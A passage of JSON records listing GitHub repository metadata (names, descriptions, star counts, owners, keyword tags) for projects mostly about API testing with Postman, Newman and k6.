vscode","fork":false,"created_at":"2018-08-21T22:47:40Z","updated_at":"2018-08-21T22:53:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":9693176,"owner_login":"dayemsiddiqui","owner_avatar_url":"https://avatars1.githubusercontent.com/u/9693176?v=4","pulled":1,"tags":["test","testing","code","extension","within","vscode"]},{"id":240128652,"name":"TestingBackup","full_name":"tvaroglu/TestingBackup","description":"Backup repo for Postman and k6 testing files","fork":false,"created_at":"2020-02-12T22:29:58Z","updated_at":"2020-03-23T15:11:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58891447,"owner_login":"tvaroglu","owner_avatar_url":"https://avatars1.githubusercontent.com/u/58891447?v=4","pulled":1,"tags":["test","repo","testing","file","files"]},{"id":152033451,"name":"RESTful-api-nodejs","full_name":"Thom9521/RESTful-api-nodejs","description":"RESTful api lavet med nodejs og testet med postman","fork":false,"created_at":"2018-10-08T07:04:45Z","updated_at":"2018-10-08T07:08:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31951107,"owner_login":"Thom9521","owner_avatar_url":"https://avatars3.githubusercontent.com/u/31951107?v=4","pulled":1,"tags":["test"," postman","node","nodejs","lavet"]},{"id":175703568,"name":"mean_restful_routing_api","full_name":"cooperstrahan/mean_restful_routing_api","description":"Coding Dojo's Restful Routing assignment tested on Postman","fork":false,"created_at":"2019-03-14T21:36:41Z","updated_at":"2019-03-15T02:04:02Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":5920695,"owner_login":"cooperstrahan","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5920695?v=4","pulled":1,"tags":["test","sign","tested","assignment"]},{"id":161843672,"name":"auto-eng-proj","full_name":"kostanzhoglo/auto-eng-proj","description":"Some code to automate testing of API in Postman","fork":false,"created_at":"2018-12-14T21:44:45Z","updated_at":"2018-12-14T21:46:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30388021,"owner_login":"kostanzhoglo","owner_avatar_url":"https://avatars1.githubusercontent.com/u/30388021?v=4","pulled":1,"tags":["test","testing","auto","code","automat","automate"]},{"id":164263921,"name":"norman","full_name":"mamund/norman","description":"test runner for cli postman runs using newman","fork":false,"created_at":"2019-01-06T00:57:38Z","updated_at":"2019-09-20T19:23:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":38344,"owner_login":"mamund","owner_avatar_url":"https://avatars1.githubusercontent.com/u/38344?v=4","pulled":1,"tags":["test"," postman","newman","runner","runs","test run"]},{"id":35385485,"name":"jenkman","full_name":"timemachine3030/jenkman","description":"Jenkins CI testing of node API servers with Postman/Newman","fork":false,"created_at":"2015-05-10T19:48:48Z","updated_at":"2018-02-08T16:20:09Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":338063,"owner_login":"timemachine3030","owner_avatar_url":"https://avatars1.githubusercontent.com/u/338063?v=4","pulled":1,"tags":["test","testing","server","node","servers"]},{"id":136601277,"name":"swag-post-gen","full_name":"sharrop/swag-post-gen","description":"A Swagger(OAS)v2-to-Postman generator - very much sitting on the shoulders of the excellent npm:swagger2-postman-generator module, but injecting Postman tests for required fields and type conformance - derived from the Swagger/OAS file.","fork":false,"created_at":"2018-06-08T09:57:09Z","updated_at":"2018-06-08T09:59:52Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":10855105,"owner_login":"sharrop","owner_avatar_url":"https://avatars0.githubusercontent.com/u/10855105?v=4","pulled":1,"tags":["test","form","file","tests","tests ","swagger","very","generator","module","type","require","should","required","swagger2","excel","inject","fields","much"]},{"id":173066260,"name":"REST-API-for-notes-CRUD-TESTING-with-POSTMAN-TESTING-API","full_name":"DhamuSniper/REST-API-for-notes-CRUD-TESTING-with-POSTMAN-TESTING-API","description":"This app create notes based GET, POST, PUT, DELETE endpoints. This endpoint have been tested with POSTMAN API TESTING TOOL","fork":false,"created_at":"2019-02-28T07:48:28Z","updated_at":"2019-02-28T11:45:20Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22738013,"owner_login":"DhamuSniper","owner_avatar_url":"https://avatars2.githubusercontent.com/u/22738013?v=4","pulled":1,"tags":["test","create","based","endpoint","points","tested","endpoints","been","note","notes"]},{"id":197452569,"name":"postmoon","full_name":"hacknlove/postmoon","description":"Test your tests","fork":false,"created_at":"2019-07-17T19:47:03Z","updated_at":"2019-08-27T11:42:09Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21086309,"owner_login":"hacknlove","owner_avatar_url":"https://avatars0.githubusercontent.com/u/21086309?v=4","pulled":1,"tags":["test","tests"]},{"id":248478381,"name":"k6-load-testing","full_name":"TechGeekD/k6-load-testing","description":"Create & run k6 load testing script","fork":false,"created_at":"2020-03-19T10:51:13Z","updated_at":"2020-03-23T10:44:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":8087460,"owner_login":"TechGeekD","owner_avatar_url":"https://avatars1.githubusercontent.com/u/8087460?v=4","pulled":1,"tags":["test","testing","script","load"]},{"id":144176266,"name":"newman-reporter-testrail-extra","full_name":"avidit/newman-reporter-testrail-extra","description":"A newman reporter for testrail","fork":false,"created_at":"2018-08-09T16:12:13Z","updated_at":"2020-03-17T22:59:35Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":1406153,"owner_login":"avidit","owner_avatar_url":"https://avatars1.githubusercontent.com/u/1406153?v=4","pulled":1,"tags":["test","repo","newman","report","reporter","testrail"]},{"id":159257356,"name":"nodejs-restful","full_name":"edysegura/nodejs-restful","description":"A simple project to demonstrate how to create RESTful APIs with Node.js and test it with Postman","fork":false,"created_at":"2018-11-27T01:30:35Z","updated_at":"2019-12-27T18:10:26Z","stargazers_count":1,"watchers_count":1,"forks":1,"watchers":1,"score":1,"owner_id":5324414,"owner_login":"edysegura","owner_avatar_url":"https://avatars0.githubusercontent.com/u/5324414?v=4","pulled":1,"tags":["test","create","demo","demonstrate"]},{"id":69657394,"name":"newman-webhook","full_name":"kbremner/newman-webhook","description":"Runs a Postman collection of tests using newman when GitHub notifies it of a successful deployment","fork":false,"created_at":"2016-09-30T10:24:42Z","updated_at":"2020-02-19T22:38:30Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":787896,"owner_login":"kbremner","owner_avatar_url":"https://avatars0.githubusercontent.com/u/787896?v=4","pulled":1,"tags":["test","collect","collection","tests","tests ","newman"]},{"id":96758910,"name":"micro-recipe","full_name":"enahomurphy/micro-recipe","description":"test project for developing highly reusable node/mongo services recipe service ","fork":false,"created_at":"2017-07-10T09:17:26Z","updated_at":"2019-03-26T20:39:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":13594802,"owner_login":"enahomurphy","owner_avatar_url":"https://avatars0.githubusercontent.com/u/13594802?v=4","pulled":1,"tags":["test","service","node","develop","mongo","services","usable","developing","reusable","recipe","highly"]},{"id":240821019,"name":"401-28-react-api-testing-app","full_name":"doug97703/401-28-react-api-testing-app","description":"An app similar to Postman for testing API routes. Built on React","fork":false,"created_at":"2020-02-16T02:46:07Z","updated_at":"2020-03-04T18:43:40Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":50133058,"owner_login":"doug97703","owner_avatar_url":"https://avatars2.githubusercontent.com/u/50133058?v=4","pulled":1,"tags":["test","testing","route","routes"]},{"id":116392905,"name":"serverless-newman","full_name":"Mgutjahr/serverless-newman","description":"Execute newman (postman) test on AWS lambda","fork":false,"created_at":"2018-01-05T14:23:18Z","updated_at":"2020-02-17T03:56:10Z","stargazers_count":9,"watchers_count":9,"forks":2,"watchers":9,"score":1,"owner_id":3747922,"owner_login":"Mgutjahr","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3747922?v=4","pulled":1,"tags":["test","newman","lambda"]},{"id":49441118,"name":"techtalk-integration-tests-postman","full_name":"smartive/techtalk-integration-tests-postman","description":"Small demo-api to show (automated) integration tests with postman and newman","fork":false,"created_at":"2016-01-11T17:06:06Z","updated_at":"2018-04-06T09:30:00Z","stargazers_count":2,"watchers_count":2,"forks":3,"watchers":2,"score":1,"owner_id":2870077,"owner_login":"smartive","owner_avatar_url":"https://avatars3.githubusercontent.com/u/2870077?v=4","pulled":1,"tags":["test"," postman","tests","tests ","auto","automat","newman","demo","integration","automate","automated"]},{"id":117068413,"name":"postaci","full_name":"bilgetech/postaci","description":"Continuous test runner for Postman.","fork":false,"created_at":"2018-01-11T07:55:50Z","updated_at":"2018-05-11T06:58:15Z","stargazers_count":3,"watchers_count":3,"forks":2,"watchers":3,"score":1,"owner_id":33055402,"owner_login":"bilgetech","owner_avatar_url":"https://avatars1.githubusercontent.com/u/33055402?v=4","pulled":1,"tags":["test","runner","test run"]},{"id":174181931,"name":"role_based_authentication_With-MEN","full_name":"nandymandy1/role_based_authentication_With-MEN","description":"In this repository I have created simple role based authentication using Node.js express mongodb and tested with Postman.","fork":false,"created_at":"2019-03-06T16:35:33Z","updated_at":"2020-03-17T19:34:48Z","stargazers_count":14,"watchers_count":14,"forks":6,"watchers":14,"score":1,"owner_id":29309671,"owner_login":"nandymandy1","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29309671?v=4","pulled":1,"tags":["test","create","repo","repos","repository","based","express","mongo"," express","auth","tested","authentication","mongod","mongodb","role"]},{"id":157299107,"name":"Swell","full_name":"open-source-labs/Swell","description":"Swell: API development tool that enables developers to test endpoints served over streaming technologies including Server-Sent Events (SSE), WebSockets, HTTP2, GraphQL, and gRPC.","fork":false,"created_at":"2018-11-13T01:01:39Z","updated_at":"2020-03-30T21:59:44Z","stargazers_count":294,"watchers_count":294,"forks":19,"watchers":294,"score":1,"owner_id":49530926,"owner_login":"open-source-labs","owner_avatar_url":"https://avatars3.githubusercontent.com/u/49530926?v=4","pulled":1,"tags":["test","tool","develop","endpoint","points","endpoints","development","developer","tech","developers","including","enable","enables","technologies","streaming","served"]},{"id":159415400,"name":"postman-collection-generator","full_name":"AlbertLabarento/postman-collection-generator","description":"Postman collection generator for your api's. Best used for your functional tests integrated with this package.","fork":false,"created_at":"2018-11-27T23:35:58Z","updated_at":"2019-09-27T03:58:15Z","stargazers_count":4,"watchers_count":4,"forks":3,"watchers":4,"score":1,"owner_id":12888117,"owner_login":"AlbertLabarento","owner_avatar_url":"https://avatars2.githubusercontent.com/u/12888117?v=4","pulled":1,"tags":["test","collect","collection","tests","tests ","function","functional","package","generator","integrate","integrated"]},{"id":23843791,"name":"Postman","full_name":"streeetlamp/Postman","description":"A test in sending electronic mail","fork":false,"created_at":"2014-09-09T17:35:22Z","updated_at":"2016-03-11T16:15:36Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1740634,"owner_login":"streeetlamp","owner_avatar_url":"https://avatars2.githubusercontent.com/u/1740634?v=4","pulled":1,"tags":["test","mail","send","sending","electron","electronic"]},{"id":102140995,"name":"postman","full_name":"coonslib/postman","description":"postman tests","fork":false,"created_at":"2017-09-01T18:18:14Z","updated_at":"2017-09-01T19:34:55Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":31517382,"owner_login":"coonslib","owner_avatar_url":"https://avatars2.githubusercontent.com/u/31517382?v=4","pulled":1,"tags":["test","tests","postman tests"]},{"id":145584754,"name":"Postman","full_name":"w100frt/Postman","description":null,"fork":false,"created_at":"2018-08-21T15:38:18Z","updated_at":"2019-08-05T19:09:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41997349,"owner_login":"w100frt","owner_avatar_url":"https://avatars1.githubusercontent.com/u/41997349?v=4","pulled":1,"tags":[]},{"id":148110582,"name":"Postman","full_name":"SarahZeineddine/Postman","description":null,"fork":false,"created_at":"2018-09-10T06:41:37Z","updated_at":"2018-09-11T09:28:07Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43129762,"owner_login":"SarahZeineddine","owner_avatar_url":"https://avatars2.githubusercontent.com/u/43129762?v=4","pulled":1,"tags":[]},{"id":147300547,"name":"postman","full_name":"jScripe/postman","description":null,"fork":false,"created_at":"2018-09-04T06:47:30Z","updated_at":"2018-09-04T07:52:43Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":33716163,"owner_login":"jScripe","owner_avatar_url":"https://avatars1.githubusercontent.com/u/33716163?v=4","pulled":1,"tags":[]},{"id":154320304,"name":"postman","full_name":"stephenpaulwilson/postman","description":null,"fork":false,"created_at":"2018-10-23T11:59:12Z","updated_at":"2018-10-23T11:59:12Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44397019,"owner_login":"stephenpaulwilson","owner_avatar_url":"https://avatars0.githubusercontent.com/u/44397019?v=4","pulled":1,"tags":[]},{"id":152729512,"name":"postman","full_name":"anunda51/postman","description":null,"fork":false,"created_at":"2018-10-12T09:47:04Z","updated_at":"2018-10-12T09:49:23Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":42669270,"owner_login":"anunda51","owner_avatar_url":"https://avatars1.githubusercontent.com/u/42669270?v=4","pulled":1,"tags":[]},{"id":118089723,"name":"postman","full_name":"anujtiwari05/postman","description":"This repository is for API  testing","fork":false,"created_at":"2018-01-19T07:01:29Z","updated_at":"2019-06-15T08:26:34Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":34908204,"owner_login":"anujtiwari05","owner_avatar_url":"https://avatars0.githubusercontent.com/u/34908204?v=4","pulled":1,"tags":["test","repo","testing","repos","repository"]},{"id":207874110,"name":"Postman","full_name":"Sayoan/Postman","description":"Conceitos e Testes de API Tipos de Requisições Pre-Request´s Variáveis de Ambiente Testes de Contrato Testes de Conteúdo Automatizando os Testes com Newman Rodando testes Newman + Docker Macetes","fork":false,"created_at":"2019-09-11T17:57:24Z","updated_at":"2019-11-25T19:01:11Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":19296481,"owner_login":"Sayoan","owner_avatar_url":"https://avatars1.githubusercontent.com/u/19296481?v=4","pulled":1,"tags":["test","testes"]},{"id":229700445,"name":"postman","full_name":"dawoodabbas261995/postman","description":null,"fork":false,"created_at":"2019-12-23T07:31:03Z","updated_at":"2019-12-23T07:33:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":58254279,"owner_login":"dawoodabbas261995","owner_avatar_url":"https://avatars1.githubusercontent.com/u/58254279?v=4","pulled":1,"tags":[]},{"id":176772695,"name":"Postman","full_name":"Tigersolv/Postman","description":"Postman tests","fork":false,"created_at":"2019-03-20T16:18:57Z","updated_at":"2019-11-12T10:37:27Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30730666,"owner_login":"Tigersolv","owner_avatar_url":"https://avatars3.githubusercontent.com/u/30730666?v=4","pulled":1,"tags":["test","tests"]},{"id":98777887,"name":"postman","full_name":"rramona2/postman","description":"API streaming tests","fork":false,"created_at":"2017-07-30T05:47:27Z","updated_at":"2017-11-17T00:10:22Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":14211666,"owner_login":"rramona2","owner_avatar_url":"https://avatars2.githubusercontent.com/u/14211666?v=4","pulled":1,"tags":["test","tests","streaming"]},{"id":202604334,"name":"Postman","full_name":"nardin/Postman","description":"just the test application","fork":false,"created_at":"2019-08-15T20:04:54Z","updated_at":"2019-08-20T22:12:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":780901,"owner_login":"nardin","owner_avatar_url":"https://avatars1.githubusercontent.com/u/780901?v=4","pulled":1,"tags":["test","application"]},{"id":208562257,"name":"PostmanRepository","full_name":"shreyaps/PostmanRepository","description":"This is a test repository created by Postman","fork":false,"created_at":"2019-09-15T08:11:34Z","updated_at":"2019-09-15T08:11:34Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30948390,"owner_login":"shreyaps","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30948390?v=4","pulled":1,"tags":["test","create","repo","repos","repository"]},{"id":71074068,"name":"PostmanTests","full_name":"genesiscruz/PostmanTests","description":"This is a repository that will consist of version control for postman tests","fork":false,"created_at":"2016-10-16T20:04:47Z","updated_at":"2016-10-16T20:04:47Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":21108788,"owner_login":"genesiscruz","owner_avatar_url":"https://avatars2.githubusercontent.com/u/21108788?v=4","pulled":1,"tags":["test"," postman","repo","repos","repository","tests","version","control","postman tests","consist"]},{"id":100746984,"name":"Postman","full_name":"priscilahenriques2050/Postman","description":"Tool for performing service tests","fork":false,"created_at":"2017-08-18T20:15:08Z","updated_at":"2017-08-21T02:07:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":4249709,"owner_login":"priscilahenriques2050","owner_avatar_url":"https://avatars0.githubusercontent.com/u/4249709?v=4","pulled":1,"tags":["test","form","tests","service","perform","performing"]},{"id":110729696,"name":"postman","full_name":"pts-mattdeluco/postman","description":"Postman LCP API requests, scripts, and tests.","fork":false,"created_at":"2017-11-14T18:38:29Z","updated_at":"2017-11-14T18:39:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":23040900,"owner_login":"pts-mattdeluco","owner_avatar_url":"https://avatars1.githubusercontent.com/u/23040900?v=4","pulled":1,"tags":["test","request","tests","script","requests","scripts"]},{"id":185875166,"name":"postman","full_name":"ztvo/postman","description":"Repository contains postman's tests for Tweeter API","fork":false,"created_at":"2019-05-09T21:38:03Z","updated_at":"2019-05-22T08:25:04Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1768668,"owner_login":"ztvo","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1768668?v=4","pulled":1,"tags":["test"," postman","tests","tests ","contain"]},{"id":160120186,"name":"postman","full_name":"rcherucheril/postman","description":null,"fork":false,"created_at":"2018-12-03T02:19:33Z","updated_at":"2018-12-03T02:40:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":45547830,"owner_login":"rcherucheril","owner_avatar_url":"https://avatars1.githubusercontent.com/u/45547830?v=4","pulled":1,"tags":[]},{"id":125293557,"name":"PostmanGuide","full_name":"lfmundim/PostmanGuide","description":"Useful guidelines on using Postman in a productive way to test and document APIs, with pictures","fork":false,"created_at":"2018-03-15T01:05:35Z","updated_at":"2019-09-18T21:00:53Z","stargazers_count":1,"watchers_count":1,"forks":3,"watchers":1,"score":1,"owner_id":15164001,"owner_login":"lfmundim","owner_avatar_url":"https://avatars3.githubusercontent.com/u/15164001?v=4","pulled":1,"tags":["test","document","line","product","lines","guide","guidelines","productive"]},{"id":141478282,"name":"PostmanYelp","full_name":"Jesse-Penber/PostmanYelp","description":"API testing on Yelp Fusion in Postman, using JSON and Javascript","fork":false,"created_at":"2018-07-18T19:04:19Z","updated_at":"2018-07-20T20:47:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":41349257,"owner_login":"Jesse-Penber","owner_avatar_url":"https://avatars1.githubusercontent.com/u/41349257?v=4","pulled":1,"tags":["test","testing","script"]},{"id":138736713,"name":"PostmanDemo","full_name":"jainishkpd/PostmanDemo","description":null,"fork":false,"created_at":"2018-06-26T12:44:25Z","updated_at":"2018-06-26T12:45:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30043533,"owner_login":"jainishkpd","owner_avatar_url":"https://avatars2.githubusercontent.com/u/30043533?v=4","pulled":1,"tags":[]},{"id":122472878,"name":"postmanCollections","full_name":"deepakjaggi/postmanCollections","description":null,"fork":false,"created_at":"2018-02-22T12:01:58Z","updated_at":"2018-05-25T07:34:17Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":26724632,"owner_login":"deepakjaggi","owner_avatar_url":"https://avatars1.githubusercontent.com/u/26724632?v=4","pulled":1,"tags":[]},{"id":121357740,"name":"PostmanLogin","full_name":"KingSoloMona/PostmanLogin","description":null,"fork":false,"created_at":"2018-02-13T08:32:39Z","updated_at":"2018-02-13T08:32:39Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":30595611,"owner_login":"KingSoloMona","owner_avatar_url":"https://avatars0.githubusercontent.com/u/30595611?v=4","pulled":1,"tags":[]},{"id":179114720,"name":"postmanTest","full_name":"rtboudreau/postmanTest","description":"postmand test","fork":false,"created_at":"2019-04-02T16:11:30Z","updated_at":"2019-04-02T16:11:30Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":37483577,"owner_login":"rtboudreau","owner_avatar_url":"https://avatars1.githubusercontent.com/u/37483577?v=4","pulled":1,"tags":["test","postmand"]},{"id":184433687,"name":"PostmanAPI","full_name":"pbenipal61/PostmanAPI","description":null,"fork":false,"created_at":"2019-05-01T15:03:22Z","updated_at":"2020-01-14T08:55:00Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":43063814,"owner_login":"pbenipal61","owner_avatar_url":"https://avatars1.githubusercontent.com/u/43063814?v=4","pulled":1,"tags":[]},{"id":233931044,"name":"postmanApis","full_name":"jnrch/postmanApis","description":"Ejercicio de test de APIs con Postman","fork":false,"created_at":"2020-01-14T20:38:13Z","updated_at":"2020-01-14T20:46:48Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":34987749,"owner_login":"jnrch","owner_avatar_url":"https://avatars0.githubusercontent.com/u/34987749?v=4","pulled":1,"tags":["test"]},{"id":158262617,"name":"postman","full_name":"jnafolayan/postman","description":"minimal api testing interface","fork":false,"created_at":"2018-11-19T17:09:33Z","updated_at":"2018-11-20T04:09:21Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":44870530,"owner_login":"jnafolayan","owner_avatar_url":"https://avatars1.githubusercontent.com/u/44870530?v=4","pulled":1,"tags":["test","testing","face","interface","mini","minimal"]},{"id":161052802,"name":"RAWDATA_E2018_Exercise4_3-testing","full_name":"JonasMGit/RAWDATA_E2018_Exercise4_3-testing","description":"testing postman","fork":false,"created_at":"2018-12-09T15:23:25Z","updated_at":"2018-12-10T14:21:25Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17292555,"owner_login":"JonasMGit","owner_avatar_url":"https://avatars3.githubusercontent.com/u/17292555?v=4","pulled":1,"tags":["test"," postman","testing"]},{"id":227934755,"name":"PostmanGettingStarted","full_name":"jeisenbergTechtonic/PostmanGettingStarted","description":null,"fork":false,"created_at":"2019-12-13T22:49:52Z","updated_at":"2019-12-13T22:52:56Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":51173111,"owner_login":"jeisenbergTechtonic","owner_avatar_url":"https://avatars1.githubusercontent.com/u/51173111?v=4","pulled":1,"tags":[]},{"id":232916790,"name":"api-rest","full_name":"BermudezK/api-rest","description":"postman test","fork":false,"created_at":"2020-01-09T22:18:36Z","updated_at":"2020-01-09T22:49:05Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":28552301,"owner_login":"BermudezK","owner_avatar_url":"https://avatars1.githubusercontent.com/u/28552301?v=4","pulled":1,"tags":["test"]},{"id":188245041,"name":"common-api-tests_js","full_name":"digipolisantwerp/common-api-tests_js","description":"Bundled of the most commonly used Postman test scripts in one JavaScript file.","fork":false,"created_at":"2019-05-23T13:58:58Z","updated_at":"2020-03-16T13:04:27Z","stargazers_count":0,"watchers_count":0,"forks":2,"watchers":0,"score":1,"owner_id":16398335,"owner_login":"digipolisantwerp","owner_avatar_url":"https://avatars2.githubusercontent.com/u/16398335?v=4","pulled":1,"tags":["test","file","script","scripts","common"]},{"id":104276282,"name":"openapi-auto-test","full_name":"dtzar/openapi-auto-test","description":"Automatically reads an OpenAPI 3.0 defintion and generates a Postman collection to be used with newman for automated API tests.","fork":false,"created_at":"2017-09-20T23:03:12Z","updated_at":"2019-10-23T21:39:27Z","stargazers_count":22,"watchers_count":22,"forks":1,"watchers":22,"score":1,"owner_id":3578906,"owner_login":"dtzar","owner_avatar_url":"https://avatars1.githubusercontent.com/u/3578906?v=4","pulled":1,"tags":["test","collect","collection","tests","call","auto","automat","newman","generate","read","automate","automated","generates","reads"]},{"id":99050227,"name":"nman-bdd","full_name":"Micah-N/nman-bdd","description":"Postman/Newman API testing using the 'Postman-BDD' library","fork":false,"created_at":"2017-08-01T23:04:16Z","updated_at":"2017-08-01T23:13:57Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29662198,"owner_login":"Micah-N","owner_avatar_url":"https://avatars3.githubusercontent.com/u/29662198?v=4","pulled":1,"tags":["test","testing","library"]},{"id":59385468,"name":"jetman","full_name":"hantuzun/jetman","description":"A better tool for testing APIs","fork":false,"created_at":"2016-05-21T23:10:31Z","updated_at":"2020-03-02T17:57:12Z","stargazers_count":23,"watchers_count":23,"forks":0,"watchers":23,"score":1,"owner_id":2770895,"owner_login":"hantuzun","owner_avatar_url":"https://avatars1.githubusercontent.com/u/2770895?v=4","pulled":1,"tags":["test","testing","tool","better"]},{"id":205783089,"name":"postmancontracttest","full_name":"gururajhm/postmancontracttest","description":"postman contract testing","fork":false,"created_at":"2019-09-02T05:30:19Z","updated_at":"2019-09-03T17:20:51Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":3702097,"owner_login":"gururajhm","owner_avatar_url":"https://avatars2.githubusercontent.com/u/3702097?v=4","pulled":1,"tags":["test","testing","contract"]},{"id":146475696,"name":"pmat","full_name":"josuamanuel/pmat","description":"postman automation testing","fork":false,"created_at":"2018-08-28T16:27:32Z","updated_at":"2019-04-11T12:57:54Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":39583890,"owner_login":"josuamanuel","owner_avatar_url":"https://avatars1.githubusercontent.com/u/39583890?v=4","pulled":1,"tags":["test","testing","auto","automat","automation"]},{"id":245431735,"name":"postman-automatic-test-chrome-driver","full_name":"sirgloveface/postman-automatic-test-chrome-driver","description":"Postman automatic test project.","fork":false,"created_at":"2020-03-06T13:50:38Z","updated_at":"2020-03-09T13:17:03Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":24394097,"owner_login":"sirgloveface","owner_avatar_url":"https://avatars3.githubusercontent.com/u/24394097?v=4","pulled":1,"tags":["test","auto","automat","automatic"]},{"id":234347987,"name":"pits","full_name":"luanphandinh/pits","description":"postman integration test utils","fork":false,"created_at":"2020-01-16T15:16:44Z","updated_at":"2020-01-27T15:49:24Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":17347674,"owner_login":"luanphandinh","owner_avatar_url":"https://avatars0.githubusercontent.com/u/17347674?v=4","pulled":1,"tags":["test","util","integration","utils"]},{"id":160838567,"name":"request_tests","full_name":"tjallen27/request_tests","description":"request tests with Postman","fork":false,"created_at":"2018-12-07T15:05:35Z","updated_at":"2018-12-08T16:20:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22148681,"owner_login":"tjallen27","owner_avatar_url":"https://avatars2.githubusercontent.com/u/22148681?v=4","pulled":1,"tags":["test","request","tests","tests "]},{"id":249818745,"name":"nodejs-test","full_name":"amathm/nodejs-test","description":"testing postman and nodejs","fork":false,"created_at":"2020-03-24T21:10:45Z","updated_at":"2020-03-24T21:13:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":16358458,"owner_login":"amathm","owner_avatar_url":"https://avatars0.githubusercontent.com/u/16358458?v=4","pulled":1,"tags":["test"," postman","testing","node","nodejs"]},{"id":199586552,"name":"forgeman","full_name":"ildanno/forgeman","description":"Command-line test runner built on top of Postman/Newman","fork":false,"created_at":"2019-07-30T06:11:31Z","updated_at":"2019-11-08T14:44:04Z","stargazers_count":2,"watchers_count":2,"forks":1,"watchers":2,"score":1,"owner_id":8035078,"owner_login":"ildanno","owner_avatar_url":"https://avatars2.githubusercontent.com/u/8035078?v=4","pulled":1,"tags":["test","line","built","runner","test run"]},{"id":95892938,"name":"postman-api","full_name":"gokul87/postman-api","description":"Demonstration of creating automated api test using postman framework","fork":false,"created_at":"2017-06-30T13:53:07Z","updated_at":"2017-07-28T20:39:45Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":4704837,"owner_login":"gokul87","owner_avatar_url":"https://avatars3.githubusercontent.com/u/4704837?v=4","pulled":1,"tags":["test"," postman","auto","automat","framework","creating","automate","automated"]},{"id":157856924,"name":"Postman_intern","full_name":"ritikgarg1234/Postman_intern","description":null,"fork":false,"created_at":"2018-11-16T11:14:54Z","updated_at":"2018-11-16T11:15:39Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":28688528,"owner_login":"ritikgarg1234","owner_avatar_url":"https://avatars1.githubusercontent.com/u/28688528?v=4","pulled":1,"tags":[]},{"id":57305416,"name":"Postman-Jasmine","full_name":"IPWright83/Postman-Jasmine","description":"Allow the creation of Jasmine style tests within 